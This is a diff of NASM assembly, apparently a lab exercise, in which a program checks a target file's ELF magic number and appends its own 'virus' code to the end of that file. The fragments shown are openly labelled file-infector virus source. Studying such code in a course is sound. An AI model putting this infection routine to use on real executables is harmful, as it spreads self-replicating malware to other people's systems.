@@ -85,9 +85,10 @@ _start:
     %define %$loc ebp-4
     %define %$fd ebp-8
     %define %$fsz ebp-12
-    %define %$mag ebp-16
-    %define %$p_mag ebp-20
-    %define %$virus_code_size ebp-24
+    
+    ; task 0b
+    %define %$mag ebp-20
+    %define %$p_mag ebp-24
 
     .print_msg:
     get_lbl_loc [%$loc], msg
@@ -123,10 +124,11 @@ _start:
     jne .invalid_elf_magic_number
 
     .valid_elf_magic_number:
-    jmp .seek_to_end
+    jmp .end_check_elf_magic_number
 
     .invalid_elf_magic_number:
     exit 2
+    .end_check_elf_magic_number:
 
     .seek_to_end:
     lseek [%$fd], 0, SEEK_END
@@ -134,11 +136,7 @@ _start:
 
     .append_virus_code:
     get_lbl_loc [%$loc], virus_start
-    get_lbl_loc virus_end
-    sub edx, [%$loc]
-    mov dword [%$virus_code_size], edx
-    get_lbl_loc [%$loc], virus_start
-    write [%$fd], [%$loc], [%$virus_code_size]
+    write [%$fd], [%$loc], (virus_end - virus_start)
 
     .close_file:
     close [%$fd]
